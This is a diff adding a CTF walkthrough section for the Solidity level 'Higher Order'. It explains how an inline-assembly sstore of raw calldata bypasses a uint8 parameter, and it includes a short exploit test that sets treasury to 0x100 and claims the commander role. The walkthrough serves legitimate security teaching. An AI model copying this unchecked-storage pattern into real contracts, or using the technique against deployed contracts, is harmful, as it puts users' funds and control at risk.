@@ -32,6 +32,7 @@
 - [27 Good Samaritan](#27-good-samaritan)
 - [28 Gatekeeper Three](#28-gatekeeper-three)
 - [29 Switch](#29-switch)
+- [30 Higher Order](#30-higher-order)
 
 <!-- /MarkdownTOC -->
 
@@ -2136,3 +2137,55 @@ success;
 
 * https://docs.soliditylang.org/en/v0.8.21/abi-spec.html
 * https://docs.soliditylang.org/en/v0.8.21/abi-spec.html#use-of-dynamic-types
+
+## 30 Higher Order
+
+To beat this level, we need to comply with
+
+```solidity
+instance.commander() == _player;
+```
+
+### Solution
+
+The function `claimLeadership()` allows the player to become the `commander`, provided that the value of the `treasury` variable exceeds `255`.
+
+```solidity
+function claimLeadership() public {
+    if (treasury > 255) commander = msg.sender;
+    else revert("Only members of the Higher Order can become Commander");
+}
+```
+
+The issue is that the function responsible for updating the `treasury` variable takes an input parameter of type `uint8`.
+
+```solidity
+function registerTreasury(uint8) public {
+    assembly {
+        sstore(treasury_slot, calldataload(4))
+    }
+}
+```
+
+Here, `calldataload(p)` reads 32 bytes from calldata starting at the specified offset `p`. The value is then written directly into the designated storage slot using `sstore()`. However, `sstore()` does not enforce type restrictions on the value being stored. This allows us to bypass the `uint8` constraint and provide a value greater than `255`. For instance, we can use `0x0100`, which exceeds the maximum value of `0xff` (255 in decimal).
+
+### Implementation
+
+The following exploit demonstrates how to achieve this:
+
+```solidity
+function testExploit() public {
+  (bool success,) = challengeAddress.call(abi.encodeWithSignature("registerTreasury(uint8)", uint16(0x100)));
+  require(success, "registerTreasury failed");
+
+  (success,) = challengeAddress.call(abi.encodeWithSignature("claimLeadership()"));
+  require(success, "claimLeadership failed");
+
+  utils.submitLevelInstance(challengeAddress);
+}
+```
+
+### References
+
+* [Solidity Documentation - Yul](https://docs.soliditylang.org/en/v0.8.28/yul.html)
+  * Focus on the `calldataload(p)` operation.
